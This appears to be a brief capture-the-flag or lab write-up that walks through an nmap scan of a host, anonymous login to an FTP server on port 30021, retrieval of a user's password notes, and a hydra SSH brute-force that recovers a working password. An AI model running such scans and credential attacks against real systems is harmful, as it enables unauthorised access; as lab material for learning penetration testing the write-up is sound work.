Did nmap scan 

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-05 14:53 UTC
Nmap scan report for 10.129.72.241
Host is up (0.021s latency).
Not shown: 65529 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
53/tcp    open  domain
110/tcp   open  pop3
995/tcp   open  pop3s
2121/tcp  open  ccproxy-ftp
30021/tcp open  unknown
```

Investigated port 30021 more closely.. Seems to be an ftp server:
```
nmap -sC -sV -p 30021 10.129.72.241
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-05 14:58 UTC
Nmap scan report for 10.129.72.241
Host is up (0.018s latency).

PORT      STATE SERVICE VERSION
30021/tcp open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (Internal FTP) [10.129.72.241]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port30021-TCP:V=7.94SVN%I=7%D=10/5%Time=68E287AE%P=x86_64-pc-linux-gnu%
SF:r(GenericLines,8F,"220\x20ProFTPD\x20Server\x20\(Internal\x20FTP\)\x20\
SF:[10\.129\.17\.238\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20mo
SF:re\x20creative\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x2
SF:0creative\r\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.33 seconds
```

Logged into the server and it supports anonymous login. Found a folder `simon` with inside a file named `mynotes.txt`.

Content of file is:
```
234987123948729384293
+23358093845098
ThatsMyBigDog
Rock!ng#May
Puuuuuh7823328
8Ns8j1b!23hs4921smHzwn
237oHs71ohls18H127!!9skaP
238u1xjn1923nZGSb261Bs81
```

Tried these credentials against ssh service with hydra:
```
hydra -l simon -P mynotes.txt ssh://10.129.72.241
Password found!:

[22][ssh] host: 10.129.72.241   login: simon   password: 8Ns8j1b!23hs4921smHzwn
```